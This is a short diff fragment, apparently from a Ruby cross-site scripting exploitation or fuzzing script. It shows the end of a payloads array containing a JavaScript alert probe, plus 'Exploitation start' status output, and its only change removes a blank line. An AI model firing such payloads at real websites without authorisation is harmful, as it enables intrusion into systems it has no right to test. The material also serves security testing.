@@ -361,7 +361,6 @@ payloads =
     "alert(/6/.source)"
   ]
 
-
 puts "[*] Exploitation start"
 puts "[*] Number of payloads: #{payloads.size} payloads" 
 
